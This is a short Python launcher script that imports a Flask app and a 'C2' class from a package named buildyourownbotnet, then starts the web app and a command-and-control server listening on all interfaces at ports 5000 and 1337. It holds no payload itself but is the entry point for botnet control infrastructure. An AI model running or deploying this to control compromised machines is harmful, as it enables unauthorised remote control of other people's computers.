from buildyourownbotnet import app, C2

if __name__ == '__main__':
	# start flask app
	app.run(host='0.0.0.0', port=5000)

	# start C2 server
	c2 = C2(host='0.0.0.0', port=1337, debug=False)
	c2.start()
